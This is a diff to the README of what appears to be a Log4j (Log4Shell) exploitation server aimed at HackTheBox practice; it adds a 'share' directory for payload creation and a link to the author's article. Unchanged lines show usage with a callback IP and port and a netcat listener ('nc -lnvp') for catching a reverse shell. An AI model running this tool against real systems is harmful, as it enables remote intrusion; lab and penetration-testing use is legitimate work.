@@ -32,6 +32,13 @@ Untar jdk in l4j_server repo directory
 tar -xvf jdk-8u202-linux-x64.tar.gz
 ```
 
+Create a share directory for payload creation and sharing.
+```
+mkdir share
+```
+
+
+
 ## Usage
 ```
 python3 l4j_server.py <callback_ip:callback_port> <HTTP_server_port> <LDAP_server_port>
@@ -42,6 +49,8 @@ nc -lnvp <callback_port>
 
 
 ## Support 
-If you appreciate my work and HackTheBox, feel free to give me some respect:  
+If you appreciate my work and HackTheBox, feel free to give me some respect and check out my article on my climb to Guru:  
 
 <a href="https://www.hackthebox.eu/profile/5305"><img src="https://www.hackthebox.eu/badge/image/5305" width="150"></a>
+
+<a href="https://medium.com/@serialwaffle/my-climb-to-guru-on-hackthebox-fde42f9cc574">My Climb to Guru on HackTheBox</a>
